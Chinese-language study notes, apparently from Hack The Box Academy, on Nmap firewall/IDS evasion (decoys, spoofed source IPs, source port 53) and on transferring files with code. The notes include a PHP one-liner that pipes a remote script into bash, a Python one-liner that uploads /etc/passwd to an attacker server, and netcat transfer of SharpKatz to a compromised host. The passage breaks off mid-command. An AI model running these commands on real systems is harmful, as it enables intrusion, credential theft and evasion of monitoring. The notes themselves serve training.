IDS&#x2F;IPS Evasion</h1><p>Nmap为我们提供了许多不同的方法来绕过防火墙规则和IDS&#x2F;IPS。这些方法包括数据包的分段、诱饵的使用以及我们将在本节中讨论的其他方法。</p><h2 id="Firewalls"><a href="#Firewalls" class="headerlink" title="Firewalls"></a>Firewalls</h2><p>防火墙是防止来自外部网络的未经授权的连接尝试的安全措施。每个防火墙安全系统都基于一个软件组件，该组件监控防火墙和传入数据连接之间的网络流量，并根据已设置的规则决定如何处理连接。它检查单个网络数据包是否被传递、忽略或阻止。此机制旨在防止可能存在潜在危险的不必要连接。</p><h2 id="IDS-x2F-IPS"><a href="#IDS-x2F-IPS" class="headerlink" title="IDS&#x2F;IPS"></a>IDS&#x2F;IPS</h2><p>与防火墙一样，入侵检测系统（IDS）和入侵防御系统（IPS）也是基于软件的组件。IDS扫描网络以寻找潜在的攻击，对其进行分析，并报告任何检测到的攻击。IPS通过在本应检测到潜在攻击的情况下采取特定防御措施来补充IDS。对此类攻击的分析基于模式匹配和签名。如果检测到特定模式，例如服务检测扫描，IPS可以阻止挂起的连接尝试。</p><h4 id="Determine-Firewalls-and-Their-Rules"><a href="#Determine-Firewalls-and-Their-Rules" class="headerlink" title="Determine Firewalls and Their Rules"></a>Determine Firewalls and Their Rules</h4><p>我们已经知道，当一个端口显示为已筛选时，可能有几个原因。在大多数情况下，防火墙都设置了某些规则来处理特定的连接。数据包可以被丢弃，也可以被拒绝。丢弃的数据包将被忽略，主机不会返回任何响应。 这与用RST标志返回的被拒绝的数据包不同。这些数据包包含不同类型的ICMP错误代码，或者根本不包含任何内容。 此类错误可能是：</p><ul><li>无法访问网络</li><li>禁用网络 </li><li>主机不可达 </li><li>禁止主机 </li><li>端口不可达 </li><li>无法访问协议</li></ul><p>与常规的SYN（-sS）或Connect扫描（sT）相比，Nmap的TCP ACK扫描（-sA）方法更难过滤防火墙和IDS&#x2F;IPS系统，因为它们只发送带有ACK标志的TCP数据包。当端口关闭或打开时，主机必须使用RST标志进行响应。与传出连接不同，来自外部网络的所有连接尝试（带有SYN标志）通常都会被防火墙阻止。然而，带有ACK标志的数据包通常由防火墙传递，因为防火墙无法确定连接是首先从外部网络还是从内部网络建立的。 如果我们看一下这些扫描，我们会发现结果有什么不同。</p><h4 id="SYN-Scan"><a href="#SYN-Scan" class="headerlink" title="SYN-Scan"></a>SYN-Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 21,22,25 -sS -Pn -n --disable-arp-ping --packet-traceStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 14:56 CESTSENT (0.0278s) TCP 10.10.14.2:57347 &gt; 10.129.2.28:22 S ttl=53 id=22412 iplen=44  seq=4092255222 win=1024 &lt;mss 1460&gt;SENT (0.0278s) TCP 10.10.14.2:57347 &gt; 10.129.2.28:25 S ttl=50 id=62291 iplen=44  seq=4092255222 win=1024 &lt;mss 1460&gt;SENT (0.0278s) TCP 10.10.14.2:57347 &gt; 10.129.2.28:21 S ttl=58 id=38696 iplen=44  seq=4092255222 win=1024 &lt;mss 1460&gt;RCVD (0.0329s) ICMP [10.129.2.28 &gt; 10.10.14.2 Port 21 unreachable (type=3/code=3) ] IP [ttl=64 id=40884 iplen=72 ]RCVD (0.0341s) TCP 10.129.2.28:22 &gt; 10.10.14.2:57347 SA ttl=64 id=0 iplen=44  seq=1153454414 win=64240 &lt;mss 1460&gt;RCVD (1.0386s) TCP 10.129.2.28:22 &gt; 10.10.14.2:57347 SA ttl=64 id=0 iplen=44  seq=1153454414 win=64240 &lt;mss 1460&gt;SENT (1.1366s) TCP 10.10.14.2:57348 &gt; 10.129.2.28:25 S ttl=44 id=6796 iplen=44  seq=4092320759 win=1024 &lt;mss 1460&gt;Nmap scan report for 10.129.2.28Host is up (0.0053s latency).PORT   STATE    SERVICE21/tcp filtered ftp22/tcp open     ssh25/tcp filtered smtpMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds</code></pre><h4 id="ACK-Scan"><a href="#ACK-Scan" class="headerlink" title="ACK-Scan"></a>ACK-Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-traceStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 14:57 CESTSENT (0.0422s) TCP 10.10.14.2:49343 &gt; 10.129.2.28:21 A ttl=49 id=12381 iplen=40  seq=0 win=1024SENT (0.0423s) TCP 10.10.14.2:49343 &gt; 10.129.2.28:22 A ttl=41 id=5146 iplen=40  seq=0 win=1024SENT (0.0423s) TCP 10.10.14.2:49343 &gt; 10.129.2.28:25 A ttl=49 id=5800 iplen=40  seq=0 win=1024RCVD (0.1252s) ICMP [10.129.2.28 &gt; 10.10.14.2 Port 21 unreachable (type=3/code=3) ] IP [ttl=64 id=55628 iplen=68 ]RCVD (0.1268s) TCP 10.129.2.28:22 &gt; 10.10.14.2:49343 R ttl=64 id=0 iplen=40  seq=1660784500 win=0SENT (1.3837s) TCP 10.10.14.2:49344 &gt; 10.129.2.28:25 A ttl=59 id=21915 iplen=40  seq=0 win=1024Nmap scan report for 10.129.2.28Host is up (0.083s latency).PORT   STATE      SERVICE21/tcp filtered   ftp22/tcp unfiltered ssh25/tcp filtered   smtpMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds</code></pre><table><thead><tr><th><strong>Scanning Options</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>-sS</code></td><td>Performs SYN scan on specified ports.</td></tr><tr><td><code>-sA</code></td><td>Performs ACK scan on specified ports.</td></tr><tr><td><code>-Pn</code></td><td>Disables ICMP Echo requests.</td></tr><tr><td><code>-n</code></td><td>Disables DNS resolution.</td></tr><tr><td><code>--disable-arp-ping</code></td><td>Disables ARP ping.</td></tr><tr><td><code>--packet-trace</code></td><td>Shows all packets sent and received.</td></tr></tbody></table><p>请注意我们从目标收到的RCVD数据包及其设置标志。使用SYN扫描（-sS），我们的目标试图通过发送回设置了SYN-ACK（SA）标志的数据包来建立TCP连接，使用ACK扫描（-SA），我们得到RST标志，因为TCP端口22是打开的。对于TCP端口25，我们没有收到任何返回的数据包，这表明数据包将被丢弃。</p><h2 id="Detect-IDS-x2F-IPS"><a href="#Detect-IDS-x2F-IPS" class="headerlink" title="Detect IDS&#x2F;IPS"></a>Detect IDS&#x2F;IPS</h2><p>与防火墙及其规则不同，IDS&#x2F;IPS系统的检测要困难得多，因为它们是被动的流量监控系统。IDS系统检查主机之间的所有连接。如果IDS发现包含定义的内容或规范的数据包，则会通知管理员，并在最坏的情况下采取适当的操作。 IPS系统采取管理员独立配置的措施，自动防止潜在的攻击。必须知道IDS和IPS是不同的应用程序，IPS是IDS的补充。 建议使用几个具有不同IP地址的虚拟专用服务器（VPS）来确定渗透测试期间这些系统是否在目标网络上。如果管理员检测到对目标网络的这种潜在攻击，第一步是阻止潜在攻击的IP地址。因此，我们将无法再使用该IP地址访问网络，我们的互联网服务提供商（ISP）将被联系并阻止访问所有互联网。 IDS系统通常单独用于帮助管理员检测网络上的潜在攻击。然后，他们可以决定如何处理此类连接。我们可以从管理员那里触发某些安全措施，例如，通过主动扫描单个端口及其服务。根据是否采取了特定的安全措施，我们可以检测网络是否有一些监控应用程序。 确定这样的IPS系统是否存在于目标网络中的一种方法是从单个主机（VPS）进行扫描。如果在任何时候此主机被阻止并且无法访问目标网络，我们知道管理员已经采取了一些安全措施。因此，我们可以继续使用另一个VPS进行渗透测试。 因此，我们知道我们需要更安静地进行扫描，在最好的情况下，掩盖与目标网络及其服务的所有交互。</p><h2 id="Decoys"><a href="#Decoys" class="headerlink" title="Decoys"></a>Decoys</h2><p>在某些情况下，管理员原则上会阻止来自不同区域的特定子网。这将阻止对目标网络的任何访问。另一个例子是什么时候IPS应该阻止我们。因此，Decoy扫描方法（-D）是正确的选择。通过这种方法，Nmap生成插入到IP报头中的各种随机IP地址，以伪装发送的数据包的来源。使用此方法，我们可以生成由冒号（：）分隔的特定数量（例如：5）的IP地址的随机（RND）。然后，我们的真实IP地址被随机放置在生成的IP地址之间。在下一个示例中，我们的真实IP地址因此被放置在第二个位置。另一个关键点是诱饵必须是活着的。否则，由于SYN洪泛安全机制，目标上的服务可能无法访问。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:14 CESTSENT (0.0378s) TCP 102.52.161.59:59289 &gt; 10.129.2.28:80 S ttl=42 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;SENT (0.0378s) TCP 10.10.14.2:59289 &gt; 10.129.2.28:80 S ttl=59 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;SENT (0.0379s) TCP 210.120.38.29:59289 &gt; 10.129.2.28:80 S ttl=37 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;SENT (0.0379s) TCP 191.6.64.171:59289 &gt; 10.129.2.28:80 S ttl=38 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;SENT (0.0379s) TCP 184.178.194.209:59289 &gt; 10.129.2.28:80 S ttl=39 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;SENT (0.0379s) TCP 43.21.121.33:59289 &gt; 10.129.2.28:80 S ttl=55 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;RCVD (0.1370s) TCP 10.129.2.28:80 &gt; 10.10.14.2:59289 SA ttl=64 id=0 iplen=44  seq=4056111701 win=64240 &lt;mss 1460&gt;Nmap scan report for 10.129.2.28Host is up (0.099s latency).PORT   STATE SERVICE80/tcp open  httpMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds</code></pre><table><thead><tr><th><code>-sS</code></th><th>Performs SYN scan on specified ports.</th></tr></thead><tbody><tr><td><code>-Pn</code></td><td>Disables ICMP Echo requests.</td></tr><tr><td><code>-n</code></td><td>Disables DNS resolution.</td></tr><tr><td><code>--disable-arp-ping</code></td><td>Disables ARP ping.</td></tr><tr><td><code>--packet-trace</code></td><td>Shows all packets sent and received.</td></tr><tr><td><code>-D RND:5</code></td><td>Generates five random IP addresses that indicates the source IP the connection comes from.</td></tr></tbody></table><p>伪造的数据包通常会被互联网服务提供商和路由器过滤掉，即使它们来自同一网络范围。因此，我们还可以指定我们的VPS服务器的IP地址，并将其与IP标头中的“IP ID”操作结合使用，以扫描目标。 另一种情况是，只有个别子网无法访问服务器的特定服务。因此，我们也可以手动指定源IP地址（-S），以测试我们是否使用此地址获得更好的结果。诱饵可用于SYN、ACK、ICMP扫描和操作系统检测扫描。因此，让我们看看这样一个例子，并确定它最有可能是哪种操作系统。</p><h4 id="Testing-Firewall-Rule"><a href="#Testing-Firewall-Rule" class="headerlink" title="Testing Firewall Rule"></a>Testing Firewall Rule</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p445 -OStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:23 CESTNmap scan report for 10.129.2.28Host is up (0.032s latency).PORT    STATE    SERVICE445/tcp filtered microsoft-dsMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Too many fingerprints match this host to give specific OS detailsNetwork Distance: 1 hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 3.14 seconds</code></pre><h4 id="Scan-by-Using-Different-Source-IP"><a href="#Scan-by-Using-Different-Source-IP" class="headerlink" title="Scan by Using Different Source IP"></a>Scan by Using Different Source IP</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:16 CESTNmap scan report for 10.129.2.28Host is up (0.010s latency).PORT    STATE SERVICE445/tcp open  microsoft-dsMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 4.11 seconds</code></pre><table><thead><tr><th><code>-n</code></th><th>Disables DNS resolution.</th></tr></thead><tbody><tr><td><code>-Pn</code></td><td>Disables ICMP Echo requests.</td></tr><tr><td><code>-p 445</code></td><td>Scans only the specified ports.</td></tr><tr><td><code>-O</code></td><td>Performs operation system detection scan.</td></tr><tr><td><code>-S</code></td><td>Scans the target by using different source IP address.</td></tr><tr><td><code>10.129.2.200</code></td><td>Specifies the source IP address.</td></tr><tr><td><code>-e tun0</code></td><td>Sends all requests through the specified interface.</td></tr></tbody></table><h2 id="DNS-Proxying"><a href="#DNS-Proxying" class="headerlink" title="DNS Proxying"></a>DNS Proxying</h2><p>默认情况下，除非另有规定，否则Nmap会执行反向DNS解析，以查找有关我们目标的更重要信息。这些DNS查询在大多数情况下也会被传递，因为给定的web服务器应该被找到并访问。DNS查询是通过UDP端口53进行的。TCP端口53以前仅用于DNS服务器之间的所谓“区域传输”或大于512字节的数据传输。由于IPv6和DNSSEC的扩展，这种情况正在发生越来越多的变化。这些更改导致许多DNS请求通过TCP端口53进行。 然而，Nmap仍然为我们自己指定DNS服务器提供了一种方法（–DNS server＜ns＞，＜ns＞）。如果我们在非军事区，这种方法对我们来说可能是至关重要的。该公司的DNS服务器通常比来自互联网的服务器更受信任。因此，例如，我们可以使用它们与内部网络的主机进行交互。作为另一个例子，我们可以使用TCP端口53作为扫描的源端口（–source端口）。如果管理员使用防火墙控制该端口，并且没有正确过滤IDS&#x2F;IPS，则我们的TCP数据包将受到信任并通过。</p><h4 id="SYN-Scan-of-a-Filtered-Port"><a href="#SYN-Scan-of-a-Filtered-Port" class="headerlink" title="SYN-Scan of a Filtered Port"></a>SYN-Scan of a Filtered Port</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-traceStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 22:50 CESTSENT (0.0417s) TCP 10.10.14.2:33436 &gt; 10.129.2.28:50000 S ttl=41 id=21939 iplen=44  seq=736533153 win=1024 &lt;mss 1460&gt;SENT (1.0481s) TCP 10.10.14.2:33437 &gt; 10.129.2.28:50000 S ttl=46 id=6446 iplen=44  seq=736598688 win=1024 &lt;mss 1460&gt;Nmap scan report for 10.129.2.28Host is up.PORT      STATE    SERVICE50000/tcp filtered ibm-db2Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds</code></pre><h4 id="SYN-Scan-From-DNS-Port"><a href="#SYN-Scan-From-DNS-Port" class="headerlink" title="SYN-Scan From DNS Port"></a>SYN-Scan From DNS Port</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53SENT (0.0482s) TCP 10.10.14.2:53 &gt; 10.129.2.28:50000 S ttl=58 id=27470 iplen=44  seq=4003923435 win=1024 &lt;mss 1460&gt;RCVD (0.0608s) TCP 10.129.2.28:50000 &gt; 10.10.14.2:53 SA ttl=64 id=0 iplen=44  seq=540635485 win=64240 &lt;mss 1460&gt;Nmap scan report for 10.129.2.28Host is up (0.013s latency).PORT      STATE SERVICE50000/tcp open  ibm-db2MAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds</code></pre><table><thead><tr><th><code>-sS</code></th><th>Performs SYN scan on specified ports.</th></tr></thead><tbody><tr><td><code>-Pn</code></td><td>Disables ICMP Echo requests.</td></tr><tr><td><code>-n</code></td><td>Disables DNS resolution.</td></tr><tr><td><code>--disable-arp-ping</code></td><td>Disables ARP ping.</td></tr><tr><td><code>--packet-trace</code></td><td>Shows all packets sent and received.</td></tr><tr><td><code>--source-port 53</code></td><td>Performs the scans from specified source port.</td></tr></tbody></table><p>现在我们已经发现防火墙接受TCP端口53，很可能IDS&#x2F;IPS过滤器的配置也比其他过滤器弱得多。我们可以通过尝试使用Netcat连接到此端口来测试这一点。</p><h4 id="Connect-To-The-Filtered-Port"><a href="#Connect-To-The-Filtered-Port" class="headerlink" title="Connect To The Filtered Port"></a>Connect To The Filtered Port</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ncat -nv --source-port 53 10.129.2.28 50000Ncat: Version 7.80 ( https://nmap.org/ncat )Ncat: Connected to 10.129.2.28:50000.220 ProFTPd</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="Firewall-and-IDS-x2F-IPS-Evasion-Easy-Lab"><a href="#Firewall-and-IDS-x2F-IPS-Evasion-Easy-Lab" class="headerlink" title="Firewall and IDS&#x2F;IPS Evasion - Easy Lab"></a>Firewall and IDS&#x2F;IPS Evasion - Easy Lab</h1><p>我们的客户想知道我们是否可以识别他们提供的机器运行在哪个操作系统上。提交操作系统名称作为答案。</p><p>hint：记住，你不需要提供它的版本。想想哪些服务可以为你提供有关操作系统的信息。在采访了管理员后，我们发现他们想阻止其&#x2F;24子网掩码的相邻主机相互通信。</p><p>这里明显是要使用RND制造间距，但是扫描到的结果比较迷，也没找到正确答案，两次相同的代码扫到不同的结果，也是有点人麻了……</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307082037111.png" alt="image-20230708203746705"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307082037754.png" alt="image-20230708203708394"></p><h1 id="Firewall-and-IDS-x2F-IPS-Evasion-Medium-Lab"><a href="#Firewall-and-IDS-x2F-IPS-Evasion-Medium-Lab" class="headerlink" title="Firewall and IDS&#x2F;IPS Evasion - Medium Lab"></a>Firewall and IDS&#x2F;IPS Evasion - Medium Lab</h1><p>配置传输到系统后，我们的客户想知道是否有可能找到我们目标的DNS服务器版本。提交目标的DNS服务器版本作为答案。</p><p>hint：在会议期间，管理员们谈到了我们测试的主机是一个以前没有提到的可公开访问的服务器。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307091003338.png" alt="image-20230709100334372"></p><p>–script dns-nsid：此选项指定要在扫描期间运行的特定Nmap脚本。dns-nsid脚本设计用于执行dns名称服务器标识符（nsid）查询并从dns服务器收集信息。</p><p>最高难度的就算了，人蒙了</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Other_File_Transfer</title>
      <link href="/2023/07/06/Other-File-Transfer/"/>
      <url>/2023/07/06/Other-File-Transfer/</url>
      
        <content type="html"><![CDATA[<h1 id="Transfering-Files-with-Code"><a href="#Transfering-Files-with-Code" class="headerlink" title="Transfering Files with Code"></a>Transfering Files with Code</h1><p>在我们的目标机器上安装不同的编程语言是很常见的。Python、PHP、Perl和Ruby等编程语言在Linux发行版中很常见，但也可以安装在Windows上，尽管这远不常见。 我们可以使用一些Windows默认应用程序，如cscript和mshta，来执行JavaScript或VBScript代码。JavaScript也可以在Linux主机上运行。 根据维基百科，大约有700种编程语言，我们可以用任何编程语言创建代码，将指令下载、上传或执行到操作系统。本节将提供一些使用通用编程语言的示例。</p><span id="more"></span><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>Python是一种流行的编程语言。目前支持版本3，但我们可能会发现Python 2.7版本仍然存在的服务器。Python可以使用选项-c从操作系统命令行运行一行代码。让我们看一些例子：</p><pre><code class="shell-session">Tanin@htb[/htb]$ python2.7 -c &#39;import urllib;urllib.urlretrieve (&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)&#39;</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ python3 -c &#39;import urllib.request;urllib.request.urlretrieve(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)&#39;</code></pre><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>PHP也非常流行，它提供了多种文件传输方法。根据W3Techs( <a href="https://w3techs.com/technologies/details/pl-php">According to W3Techs’ data</a>)的数据，77.4%的网站使用已知的服务器端编程语言使用PHP。尽管信息并不精确，而且数量可能略低，但我们在执行攻击性操作时经常会遇到使用PHP的web服务。 让我们看一些使用PHP下载文件的示例。 在下面的示例中，我们将使用PHP  <a href="https://www.php.net/manual/en/function.file-get-contents.php">file_get_contents() module</a> 从网站下载内容，并结合 <a href="https://www.php.net/manual/en/function.file-put-contents.php">file_put_contents() module</a>将文件保存到目录中。PHP可以用于使用选项-r从操作系统命令行运行一行代码。</p><h4 id="PHP-Download-with-File-get-contents"><a href="#PHP-Download-with-File-get-contents" class="headerlink" title="PHP Download with File_get_contents()"></a>PHP Download with File_get_contents()</h4><pre><code class="shell-session">Tanin@htb[/htb]$ php -r &#39;$file = file_get_contents(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#39;</code></pre><p>file_get_contents（）和file_put_contends（）的替代方案是fpopen（）模块。我们可以使用这个模块打开一个URL，读取它的内容并将其保存到一个文件中。</p><h4 id="PHP-Download-with-Fopen"><a href="#PHP-Download-with-Fopen" class="headerlink" title="PHP Download with Fopen()"></a>PHP Download with Fopen()</h4><pre><code class="shell-session">php -r &#39;const BUFFER = 1024; $fremote = fopen(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;rb&quot;); $flocal = fopen(&quot;LinEnum.sh&quot;, &quot;wb&quot;); while ($buffer = fread($fremote, BUFFER)) &#123; fwrite($flocal, $buffer); &#125; fclose($flocal); fclose($fremote);&#39;</code></pre><p>这段代码看起来是一个简单的文件下载操作，它尝试从指定的 URL 下载 <code>LinEnum.sh</code> 文件，并将其保存到本地。</p><p>具体来说，代码的含义如下：</p><pre><code class="php">fopen(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;rb&quot;);</code></pre><p>该行代码打开指定 URL 的远程文件，使用 <code>&quot;rb&quot;</code> 模式以二进制方式读取文件内容。</p><pre><code class="php">$flocal = fopen(&quot;LinEnum.sh&quot;, &quot;wb&quot;);</code></pre><p>该行代码创建一个名为 <code>LinEnum.sh</code> 的本地文件，使用 <code>&quot;wb&quot;</code> 模式以二进制方式写入文件内容。</p><pre><code class="php">while ($buffer = fread($fremote, BUFFER)) &#123;    fwrite($flocal, $buffer);&#125;</code></pre><p>该循环代码从远程文件中读取数据块，并将数据块写入本地文件，直到远程文件的所有数据被读取完毕。</p><pre><code class="php">fclose($flocal);fclose($fremote);</code></pre><p>最后，代码关闭打开的本地文件和远程文件。</p><p>请注意，这只是一段代码片段，缺少变量的定义和完整的执行环境。要使其正常工作，您需要在代码中定义 <code>BUFFER</code> 常量的大小，并确保您有适当的文件读写权限。另外，请确保从远程服务器下载的文件内容符合您的预期，并采取安全措施来验证和审查远程文件的来源和内容。</p><p>我们也可以将下载的内容发送到管道，类似于我们在上一节中使用cURL和wget执行的无文件示例。</p><h4 id="PHP-Download-a-File-and-Pipe-it-to-Bash"><a href="#PHP-Download-a-File-and-Pipe-it-to-Bash" class="headerlink" title="PHP Download a File and Pipe it to Bash"></a>PHP Download a File and Pipe it to Bash</h4><pre><code class="shell-session">Tanin@htb[/htb]$ php -r &#39;$lines = @file(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); foreach ($lines as $line_num =&gt; $line) &#123; echo $line; &#125;&#39; | bash</code></pre><p>这段代码使用 PHP 和 Bash 结合执行了一系列操作。具体来说，它从指定的 URL 下载 <code>LinEnum.sh</code> 文件，然后通过管道将文件内容传递给 Bash 来执行。</p><p>以下是代码的解释：</p><pre><code class="php">$lines = @file(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;);</code></pre><p>这行代码使用 <code>file()</code> 函数从指定的 URL 下载文件，并将文件内容读取到 <code>$lines</code> 数组中。<code>@</code> 符号用于忽略可能出现的错误。</p><pre><code class="php">foreach ($lines as $line_num =&gt; $line) &#123;    echo $line;&#125;</code></pre><p>这个循环遍历 <code>$lines</code> 数组中的每一行，并使用 <code>echo</code> 打印每一行的内容。这样可以将下载的文件内容输出到标准输出。</p><pre><code class="bash">| bash</code></pre><p>通过管道 <code>|</code> 将 PHP 的输出传递给 Bash，即将下载的文件内容传递给 Bash 执行。</p><p>这段代码的目的是将远程文件 <code>LinEnum.sh</code> 的内容下载并传递给 Bash 解释器执行。请注意，执行来自远程源的代码片段可能存在安全风险，因此在运行此代码之前，请确保您信任远程文件的来源，并且您已经仔细审查了其中的内容。</p><h2 id="Other-Languages"><a href="#Other-Languages" class="headerlink" title="Other Languages"></a>Other Languages</h2><p>Ruby和Perl是其他流行的语言，也可以用于传输文件。这两种编程语言还支持使用选项-e从操作系统命令行运行一行程序。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ruby -e &#39;require &quot;net/http&quot;; File.write(&quot;LinEnum.sh&quot;, Net::HTTP.get(URI.parse(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;)))&#39;</code></pre><h4 id="Perl-Download-a-File"><a href="#Perl-Download-a-File" class="headerlink" title="Perl - Download a File"></a>Perl - Download a File</h4><pre><code class="shell-session">Tanin@htb[/htb]$ perl -e &#39;use LWP::Simple; getstore(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;);&#39;</code></pre><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>JavaScript是一种脚本或编程语言，允许您在网页上实现复杂的功能。与其他编程语言一样，我们可以将它用于许多不同的事情。 以下JavaScript代码基于本文，我们可以使用它下载一个文件。我们将创建一个名为wget.js的文件，并保存以下内容：</p><pre><code class="javascript">var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;);BinStream.Type = 1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile(WScript.Arguments(1));</code></pre><p>我们可以从Windows命令提示符或PowerShell终端使用以下命令来执行JavaScript代码并下载文件。</p><pre><code class="cmd-session">C:\htb&gt; cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1</code></pre><h2 id="Upload-Operations-using-Python3"><a href="#Upload-Operations-using-Python3" class="headerlink" title="Upload Operations using Python3"></a>Upload Operations using Python3</h2><p>如果我们想上传文件，我们需要了解特定编程语言中执行上传操作的函数。Python3请求模块允许您使用Python发送HTTP请求（GET、POST、PUT等）。如果我们想将文件上传到Python3上传服务器，我们可以使用以下代码。</p><h4 id="Starting-the-Python-uploadserver-Module"><a href="#Starting-the-Python-uploadserver-Module" class="headerlink" title="Starting the Python uploadserver Module"></a>Starting the Python uploadserver Module</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 -m uploadserver File upload available at /uploadServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><h4 id="Uploading-a-File-Using-a-Python-One-liner"><a href="#Uploading-a-File-Using-a-Python-One-liner" class="headerlink" title="Uploading a File Using a Python One-liner"></a>Uploading a File Using a Python One-liner</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 -c &#39;import requests;requests.post(&quot;http://192.168.49.128:8000/upload&quot;,files=&#123;&quot;files&quot;:open(&quot;/etc/passwd&quot;,&quot;rb&quot;)&#125;)&#39;</code></pre><h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p><a href="https://sectools.org/tool/netcat/">Netcat</a> （通常缩写为nc）是一种计算机网络实用程序，用于使用TCP或UDP读取和写入网络连接，这意味着我们可以将其用于文件传输操作。 最初的Netcat是由霍比特人于1995年发行的，但尽管它很受欢迎，但一直没有得到维护。该工具的灵活性和实用性促使Nmap项目生产了 <a href="https://nmap.org/ncat/">Ncat</a>,这是一种现代的重新实现，支持SSL、IPv6、SOCKS和HTTP代理、连接代理等。 在本节中，我们将同时使用原始的Netcat和Ncat。</p><h2 id="File-Transfer-with-Netcat-and-Ncat"><a href="#File-Transfer-with-Netcat-and-Ncat" class="headerlink" title="File Transfer with Netcat and Ncat"></a>File Transfer with Netcat and Ncat</h2><p>目标或攻击机器可以用来启动连接，如果防火墙阻止访问目标，这很有帮助。让我们创建一个示例，并将一个工具转移到我们的目标。 在这个例子中，我们将把SharpKatz.exe从我们的Pwnbox转移到受损的机器上。我们将使用两种方法。让我们完成第一个。 我们将首先在受损的机器上启动Netcat（nc），使用选项-l进行侦听，使用选项-p 8000选择要侦听的端口，然后使用一个大于&gt;的值并后跟文件名SharpKatz.exe重定向stdout。</p><pre><code class="shell-session">victim@target:~$ nc -l 